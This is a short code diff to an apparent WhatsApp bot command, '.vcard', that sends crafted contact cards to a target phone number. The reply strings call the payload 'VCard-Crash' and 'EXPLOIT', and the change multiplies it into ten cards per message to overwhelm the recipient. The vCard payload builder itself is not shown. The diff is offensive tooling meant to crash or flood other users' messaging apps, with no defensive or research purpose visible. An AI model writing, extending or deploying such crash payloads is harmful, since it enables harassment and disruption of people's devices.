@@ -55,12 +55,17 @@ kiubyxmd({
     if (!q) return reply("🎯 *Usage*: `.vcard <jid>`");
 
     const target = q.includes("@") ? q.trim() : q.trim() + "@s.whatsapp.net";
-    await reply(`🃏 *V-INJECTOR*: Sending 2026 VCard-Crash to ${target.split('@')[0]}...`);
+    await reply(`🃏 *V-BLAST*: Siphoning 10x Super-Cards into ${target.split('@')[0]}...`);
+
+    const vcardArray = [];
+    for (let i = 1; i <= 10; i++) {
+        vcardArray.push({ vcard: payloads.vcard(`☠️ KIUBY_${i} ☠️`) });
+    }
 
     await client.sendMessage(target, {
         contacts: {
-            displayName: "☠️ 𝐊𝐈𝐔𝐁𝐘-𝐗Ｍ𝐃 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ☠️",
-            contacts: [{ vcard: payloads.vcard("☠️ 𝐊𝐈𝐔𝐁𝐘 ☠️") }]
+            displayName: "☠️ 𝐊𝐈𝐔𝐁𝐘 𝐍𝐄𝐔𝐑𝐀𝐋 𝐁𝐋𝐀𝐒𝐓 ☠️",
+            contacts: vcardArray
         }
     }, { quoted: mek });
 
